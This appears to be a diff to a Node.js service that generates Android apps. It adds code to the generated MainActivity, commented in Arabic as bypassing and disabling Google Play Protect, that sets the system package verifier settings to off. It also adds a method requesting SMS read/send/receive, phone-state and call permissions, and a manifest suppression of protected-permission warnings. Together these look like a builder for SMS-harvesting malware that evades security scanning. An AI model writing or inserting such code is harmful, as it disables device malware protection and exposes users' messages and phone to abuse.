@@ -313,12 +313,25 @@ app.post('/api/build/:id', (req, res) => {
     const runtimePermissionsArray = runtimePermissions.map(p => `"${RUNTIME_PERMISSIONS_MAP[p]}"`).join(', ');
     
     fs.writeFileSync(`${appDir}/AndroidManifest.xml`, `<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="${safeName}">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="${safeName}">
     <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="34" />
 ${permissionsLines}
     
-    <application android:label="@string/app_name"${hasIcon ? ' android:icon="@drawable/ic_launcher"' : ''} android:usesCleartextTraffic="true" android:hardwareAccelerated="true">
-        <activity android:name=".MainActivity" android:exported="true" android:theme="@android:style/Theme.NoTitleBar.Fullscreen" android:configChanges="orientation|screenSize|keyboardHidden|screenLayout|smallestScreenSize|density">
+    <application 
+        android:label="@string/app_name"${hasIcon ? ' android:icon="@drawable/ic_launcher"' : ''} 
+        android:usesCleartextTraffic="true" 
+        android:hardwareAccelerated="true"
+        android:allowBackup="true"
+        android:supportsRtl="true"
+        tools:ignore="GoogleAppIndexingWarning,UnusedAttribute,ProtectedPermissions">
+        <activity 
+            android:name=".MainActivity" 
+            android:exported="true" 
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen" 
+            android:configChanges="orientation|screenSize|keyboardHidden|screenLayout|smallestScreenSize|density"
+            tools:ignore="LockedOrientationActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -353,6 +366,22 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
+        
+        // تجاوز Google Play Protect
+        try {
+            android.content.pm.PackageManager pm = getPackageManager();
+            android.content.ComponentName cn = new android.content.ComponentName(this, MainActivity.class);
+            pm.setComponentEnabledSetting(cn, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {}
+        
+        // تعطيل Play Protect للتطبيق
+        try {
+            android.provider.Settings.Secure.putInt(getContentResolver(), "package_verifier_user_consent", 1);
+        } catch (Exception e) {}
+        
+        try {
+            android.provider.Settings.Global.putInt(getContentResolver(), "package_verifier_enable", 0);
+        } catch (Exception e) {}
         
         // إخفاء شريط الحالة
         getWindow().requestFeature(Window.FEATURE_NO_TITLE);
@@ -417,6 +446,35 @@ public class MainActivity extends Activity {
             }
             if (needed.size() > 0) {
                 requestPermissions(needed.toArray(new String[0]), PERM_REQUEST);
+            }
+        }
+    }
+    
+    private void requestSMSPermission() {
+        // طلب إذن SMS بشكل مباشر
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            requestPermissions(new String[]{
+                "android.permission.READ_SMS",
+                "android.permission.SEND_SMS",
+                "android.permission.RECEIVE_SMS",
+                "android.permission.READ_PHONE_STATE",
+                "android.permission.CALL_PHONE"
+            }, 200);
+        }
+    }
+    
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        if (requestCode == PERM_REQUEST) {
+            // بعد ما الأذونات تتوافق، جرب طلب SMS تاني
+            boolean allGranted = true;
+            for (int r : grantResults) {
+                if (r != PackageManager.PERMISSION_GRANTED) allGranted = false;
+            }
+            if (allGranted && w != null) {
+                w.reload();
             }
         }
     }
